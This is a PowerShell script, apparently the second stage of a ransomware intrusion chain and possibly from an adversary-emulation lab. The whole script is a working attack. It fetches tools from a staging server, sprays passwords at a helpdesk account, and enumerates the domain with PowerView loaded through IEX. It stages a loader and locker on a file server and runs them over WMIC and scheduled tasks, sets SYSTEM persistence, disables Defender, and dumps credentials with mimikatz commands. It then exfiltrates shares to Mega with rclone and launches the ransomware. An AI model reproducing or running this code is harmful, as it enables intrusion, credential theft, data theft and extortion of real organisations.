# c0015_stage2.ps1 — everything after the SYSTEM beacon, run by the stager as SYSTEM.
#
# The chain no longer depends on a machine account that has rights on the target. It sprays a weak
# helpdesk account, uses the recovered password to reach the backup server over WMI, keeps a foothold
# there, collects credentials, exfiltrates and finally runs the locker.

$ErrorActionPreference = 'Continue'
$base   = 'http://192.168.50.100'
$work   = 'C:\ProgramData\C0015'
$log    = Join-Path $work 'stage2.log'
$stage  = 'C:\Users\Public\C0015'
$target = 'FS01'
$user   = 'C0015\helpdesk'
$cands  = @('Summer2026!', 'Password123!', 'Helpdesk2026!', 'Welcome1!')

function W($s) { Add-Content -Path $log -Value ("{0} {1}" -f (Get-Date -Format 'HH:mm:ss'), $s) }
New-Item -ItemType Directory -Force -Path $work, $stage | Out-Null
W "=== stage2 start as $(whoami) ==="


function Invoke-Remote($cmd, $label) {
    & cmd.exe /c "schtasks /create /s $target /u $user /p $pw /tn C0015Task /tr `"$cmd`" /sc once /st 23:59 /ru SYSTEM /rl HIGHEST /f" 2>&1 | Out-Null
    & cmd.exe /c "schtasks /run /s $target /u $user /p $pw /tn C0015Task" 2>&1 | Out-Null
    Start-Sleep -Seconds 3
    W "remote task: $label"
}function Get-Staged($name, $dest) {
    try { Invoke-WebRequest -Uri "$base/$name" -OutFile $dest -UseBasicParsing -TimeoutSec 180; W "fetched $name"; $true }
    catch { W "fetch $name failed: $($_.Exception.Message)"; $false }
}

Get-Staged 'inj.dll'       (Join-Path $stage 'inj.dll')       | Out-Null
Get-Staged 'D8B3.bin'      (Join-Path $stage 'D8B3.bin')      | Out-Null
Get-Staged 'mk.exe'        (Join-Path $work  'mk.exe')        | Out-Null
Get-Staged 'rclone.exe'    (Join-Path $work  'rclone.exe')    | Out-Null
Get-Staged 'rclone.conf'   (Join-Path $work  'rclone.conf')   | Out-Null
Get-Staged '143.dll'       (Join-Path $work  '143.dll')       | Out-Null
Get-Staged 'locker.exe'    (Join-Path $work  'locker.exe')    | Out-Null
Get-Staged 'readme.txt'    (Join-Path $work  'readme.txt')    | Out-Null
Get-Staged 'PowerView.ps1' (Join-Path $work  'PowerView.ps1') | Out-Null

# ---------------------------------------------------------------- spray the helpdesk account
$pw = $null
foreach ($c in $cands) {
    & cmd.exe /c "net use \\DC01\IPC$ /user:$user $c" 2>&1 | Out-Null
    if ($LASTEXITCODE -eq 0) { $pw = $c; W "spray hit: $c"; break }
    & cmd.exe /c "net use \\DC01\IPC$ /delete /y" 2>&1 | Out-Null
}
if (-not $pw) { W 'spray failed' }

if ($pw) {
    # ------------------------------------------------------------ discovery and share enumeration
    $disc = Join-Path $work 'discovery.txt'
    & cmd.exe /c "whoami >> `"$disc`" 2>&1"
    & cmd.exe /c "nltest /domain_trusts /all_trusts >> `"$disc`" 2>&1"
    & cmd.exe /c "net view /all /domain >> `"$disc`" 2>&1"
    & cmd.exe /c "tasklist /s $target /u $user /p $pw >> `"$disc`" 2>&1"
    W 'discovery written'

    & powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.Webclient).DownloadString('$base/PowerView.ps1'); Invoke-ShareFinder -CheckShareAccess -Verbose" 2>&1 | Out-File (Join-Path $work 'sharefind.out') -Encoding ascii
    W 'share enumeration done'

    # ------------------------------------------------------------ stage the loader on the target
    & cmd.exe /c "net use \\$target\C$ /user:$user $pw" 2>&1 | Out-Null
    if (Test-Path "\\$target\C$") {
        Copy-Item (Join-Path $work '143.dll') "\\$target\C$\ProgramData\143.dll" -Force
        Copy-Item (Join-Path $work 'mk.exe')  "\\$target\C$\ProgramData\mk.exe" -Force
        Copy-Item (Join-Path $work 'readme.txt') "\\$target\C$\readme.txt" -Force
        $lockerName = 'o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe'
        Copy-Item (Join-Path $work 'locker.exe') "\\$target\C$\$lockerName" -Force
        Set-Content "\\$target\C$\locker.bat" "@echo off`r`nC:\$lockerName -m -net -size 10 -nomutex -p \\$target\C$" -Encoding ASCII
        W 'loader, dump tool and locker staged'
    } else { W "C$ on $target not reachable" }

    # ------------------------------------------------------------ run the loader on the target
    $wmic = & cmd.exe /c "wmic /node:$target /user:$user /password:$pw process call create `"rundll32.exe C:\ProgramData\143.dll DllRegisterServer`"" 2>&1
    W ("wmic loader: " + (($wmic | Select-String 'ReturnValue|ProcessId') -join ' '))

    # ------------------------------------------------------------ foothold on the target
    $task = & cmd.exe /c "schtasks /create /s $target /u $user /p $pw /tn C0015Persist /tr `"cmd.exe /c C:\ProgramData\143.cmd`" /sc onstart /ru SYSTEM /rl HIGHEST /f" 2>&1
    W ("persistence: " + (($task | Select-Object -First 1) -join ' '))
    & cmd.exe /c "net use \\$target\C$ /delete /y" 2>&1 | Out-Null

    # ------------------------------------------------------------ credential collection on the target
    Invoke-Remote "powershell.exe -NoProfile -Command `"Set-MpPreference -DisableRealtimeMonitoring `$true`"" 'defence relaxed on target'
    Invoke-Remote "C:\ProgramData\mk.exe privilege::debug sekurlsa::logonpasswords exit" 'credential dump on target'

    # ------------------------------------------------------------ exfiltration as the helpdesk account
    $rc = Join-Path $work 'rclone.exe'
    & cmd.exe /c "net use \\$target\Shares /user:$user $pw" 2>&1 | Out-Null
    & $rc --config (Join-Path $work 'rclone.conf') copy --max-age 2y "\\$target\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M 2>&1 | Out-Null
    W 'rclone finished'
    & cmd.exe /c "net use \\$target\Shares /delete /y" 2>&1 | Out-Null

    # ------------------------------------------------------------ impact through the same credential
    $lk = Join-Path $work 'locker.exe'
    if (Test-Path $lk) {
        Copy-Item (Join-Path $work 'readme.txt') 'C:\readme.txt' -Force
        Invoke-Remote "cmd.exe /c C:\locker.bat" 'locker on target'
    }
}

W "=== stage2 end ==="


